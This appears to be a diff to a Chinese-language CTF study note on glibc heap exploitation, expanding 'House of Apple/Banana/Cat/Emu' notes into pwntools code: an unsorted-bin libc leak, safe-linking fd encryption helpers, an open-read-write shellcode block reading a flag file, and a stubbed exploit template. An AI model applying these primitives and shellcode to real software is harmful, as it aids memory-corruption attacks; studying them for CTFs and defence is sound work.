@@ -173,43 +173,247 @@ malloc(0x1000)
 
 ## 2024-2026 新技术点
 
-### 1. glibc 2.34+ 无 hooks
+### 1. glibc 2.34+ 无 hooks 对 House 系列的影响
 
 ```python
-# 传统 __malloc_hook/__free_hook 失效
-# House of Apple/Banana/Cat 成为主流
+# glibc 2.34+ 移除 __malloc_hook/__free_hook
+# House of Storm/Husk 等经典 House 失效
+# 新 House (Apple/Banana/Cat/Emu) 成为主流
+
+from pwn import *
+
+context.arch = 'amd64'
+
+class ModernHouseExploit:
+    """glibc 2.34+ House 系列利用框架"""
+    
+    def __init__(self, p, elf, libc):
+        self.p = p
+        self.elf = elf
+        self.libc = libc
+        self.libc_base = None
+    
+    def leak_libc(self):
+        """通过 unsorted bin 泄露 libc"""
+        self.p.sendlineafter(b'>', b'1')  # malloc 0x400
+        self.p.sendlineafter(b'size:', b'0x400')
+        self.p.sendlineafter(b'>', b'2')  # free
+        self.p.sendlineafter(b'idx:', b'0')
+        self.p.sendlineafter(b'>', b'4')  # show
+        self.p.sendlineafter(b'idx:', b'0')
+        fd = u64(self.p.recv(6).ljust(8, b'\x00'))
+        self.libc_base = fd - (self.libc.symbols['main_arena'] + 96)
+        log.success(f"libc: {hex(self.libc_base)}")
+    
+    def house_of_apple2(self):
+        """
+        House of Apple 2：glibc 2.34+ 最常用
+        1. 任意分配原语（tcache/fastbin poisoning）
+        2. 构造 fake IO_FILE_plus
+        3. _wide_data + _wide_vtable 控制执行流
+        """
+        pass
+    
+    def house_of_banana(self):
+        """
+        House of Banana：glibc 2.34+
+        1. 覆盖 __exit_funcs
+        2. 构造 fake exit_function_list
+        3. exit() 时执行任意函数
+        """
+        pass
+    
+    def house_of_cat(self):
+        """
+        House of Cat：glibc 2.35+
+        1. largebin attack + IO_FILE
+        2. 支持 seccomp ORW
+        3. 2024 年 CTF 最常用
+        """
+        pass
+    
+    def house_of_emu(self):
+        """
+        House of Emu：glibc 2.36+
+        1. 利用 _IO_wstrn_jumps 等新 vtable
+        2. 绕过 2.34+ 的 vtable 范围检查
+        """
+        pass
 ```
 
-### 2. safe-linking
+### 2. safe-linking 对 House 系列的影响
 
 ```python
-# glibc 2.32+
-# tcache/fastbin 指针加密
-# 影响 House of Spirit 等
+# glibc 2.32+ safe-linking 影响所有需要修改 fd 指针的 House
+
+from pwn import *
+
+context.arch = 'amd64'
+
+def safe_linking_house_bypass():
+    """safe-linking 下各 House 的调整"""
+    
+    # === House of Spirit ===
+    # 在栈/BSS 上伪造 chunk 时：
+    # fd 指针需要经过 safe-linking 加密
+    # 需要泄露堆地址才能计算加密值
+    
+    # === House of Force ===
+    # glibc < 2.29，safe-linking (2.32+) 之前
+    # 不受影响（已失效）
+    
+    # === House of Apple 2 ===
+    # tcache/fastbin poisoning 需要加密 fd
+    # 泄露堆地址 -> 计算加密值 -> 覆盖 fd
+    
+    # === 通用绕过模板 ===
+    def encrypt_fd(chunk_addr, target):
+        """safe-linking 加密"""
+        return (chunk_addr >> 12) ^ target
+    
+    def decrypt_fd(chunk_addr, encrypted):
+        """safe-linking 解密"""
+        return (chunk_addr >> 12) ^ encrypted
+    
+    def leak_heap(p, malloc, free, show):
+        """泄露堆地址"""
+        # 分配两个 chunk，释放后读取加密 fd
+        pass
 ```
 
-### 3. 硬件级防护
+### 3. 硬件级防护对 House 系列的影响
 
 ```python
-# Intel CET
-# ARM PAC/BTI
-# MTE (Memory Tagging Extension)
-# 影响 House 系列
+# Intel CET / ARM PAC+BTI / ARM MTE
+
+from pwn import *
+
+def hardware_house_bypass():
+    """硬件防护下 House 系列的调整"""
+    
+    # === MTE ===
+    # 所有堆操作都需要 tag 匹配
+    # House of Spirit 在栈上伪造 chunk 时，tag 必须正确
+    # 绕过：tag spraying / 部分覆盖
+    
+    # === CET Shadow Stack ===
+    # 覆盖返回地址时影子栈检测
+    # House of Apple 2/3 不覆盖返回地址（通过函数指针）
+    # 仍然可用
+    
+    # === PAC ===
+    # ARM 设备上利用时：
+    # 函数指针需要合法的 PAC 签名
+    # House of Apple 2 通过 _wide_vtable 间接调用
+    # 需要确保 _wide_vtable 中的函数指针有效
+    pass
 ```
 
-### 4. 沙箱环境
+### 4. 沙箱环境 House 系列
 
 ```python
-# seccomp 限制
-# 通过 ORW (open/read/write) 绕过
-# House of Cat 支持 ORW
+# seccomp 限制下的 House 系列
+
+from pwn import *
+
+context.arch = 'amd64'
+
+def house_orw_template():
+    """House 系列 + ORW"""
+    
+    # === House of Cat + ORW（2024 CTF 最常用）===
+    # 1. largebin attack 修改 _IO_list_all
+    # 2. 构造 fake IO_FILE
+    # 3. 在 _wide_data 中嵌入 ORW shellcode
+    # 4. 触发 _IO_wfile_overflow -> 执行 shellcode
+    
+    # ORW shellcode（通过 IO_FILE 触发）
+    orw_sc = asm(f'''
+        /* 打开 flag 文件 */
+        xor eax, eax
+        push rax
+        mov rdi, 0x67616c66    /* "flag" */
+        push rdi
+        mov rdi, rsp
+        mov al, 2              /* sys_open */
+        xor esi, esi           /* O_RDONLY */
+        syscall
+        
+        /* 读取 flag 内容 */
+        mov edi, eax            /* fd */
+        mov rsi, rsp            /* buf */
+        mov dl, 0x40            /* size */
+        xor eax, eax            /* sys_read */
+        syscall
+        
+        /* 写入 stdout */
+        mov edx, eax            /* len */
+        mov dil, 1              /* stdout */
+        mov al, 1               /* sys_write */
+        syscall
+    ''')
+    
+    # === House of Apple 2 + ORW ===
+    # 1. tcache poisoning 分配到 _IO_list_all
+    # 2. 构造 fake IO_FILE
+    # 3. 通过 _wide_data 控制执行 ORW
 ```
 
-### 5. 新型 House
+### 5. 新型 House 发展趋势 (2024-2026)
 
 ```python
-# 持续有新的 House 被发现
-# 关注最新研究
+# 2024-2026 House 系列的发展趋势
+
+from pwn import *
+
+# === 趋势 1：IO_FILE 成为核心 ===
+# 所有新 House 都基于 IO_FILE 利用
+# 原因：glibc 2.34+ 移除 hooks
+# IO_FILE 是少数仍可利用的机制
+
+# === 趋势 2：wide char 函数利用 ===
+# _IO_wfile_overflow / _IO_wdoallocbuf / _IO_WDOALLOCATE
+# 成为新的控制流劫持点
+# 绕过了 narrow char 的 vtable 检查
+
+# === 趋势 3：seccomp + ORW ===
+# 2024+ CTF 中大多数题目都有 seccomp
+# House 系列需要支持 ORW 输出
+# House of Cat 是首选（原生支持 ORW）
+
+# === 趋势 4：多阶段利用 ===
+# 需要多次泄露、多次分配
+# 利用链越来越长
+# 需要更精细的堆布局控制
+
+# === 未来可能的新 House ===
+# 基于 glibc 2.37+ 的新特性
+# 基于新 CPU 特性（CET/PAC/MTE）
+# 基于新编译器优化
+
+# === 实用利用模板（2024+ 通用）===
+def universal_house_exploit():
+    """通用 House 利用模板 (2024+)"""
+    p = process('./pwn')
+    elf = ELF('./pwn')
+    libc = ELF('./libc.so.6')
+    
+    # Step 1: 信息泄露
+    # 泄露 libc、堆、栈地址
+    
+    # Step 2: 任意写原语
+    # tcache poisoning / fastbin attack / largebin attack
+    
+    # Step 3: 选择利用路径
+    # 如果有 seccomp: House of Cat + ORW
+    # 如果无 seccomp: House of Apple 2 + system
+    # 如果 glibc 2.34+: House of Banana + exit_funcs
+    
+    # Step 4: 构造 fake 数据结构
+    
+    # Step 5: 触发执行
+    
+    p.interactive()
 ```
 
 ## 工具推荐
